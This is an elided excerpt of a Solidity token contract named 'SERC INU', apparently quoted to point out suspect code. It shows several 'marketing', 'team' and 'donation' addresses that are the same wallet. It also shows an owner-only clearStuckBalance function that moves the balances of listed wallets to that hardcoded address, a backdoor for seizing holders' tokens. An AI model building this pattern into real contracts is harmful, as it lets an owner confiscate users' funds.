...
contract SERC is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0x7b90EeAF7B9519122717E128312774BCC521b03F));
    address payable public _teamwallet =
        payable(address(0x7b90EeAF7B9519122717E128312774BCC521b03F));
    address _partnershipswallet =
        payable(address(0xE829C12111a5E1Fb063e16fe65859F076fcdF3f7));
    address private _donationAddress =
        0x7b90EeAF7B9519122717E128312774BCC521b03F;

    string private _name = "SERC INU";
    string private _symbol = "SERCINU";
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0x7b90EeAF7B9519122717E128312774BCC521b03F), amount);
        }
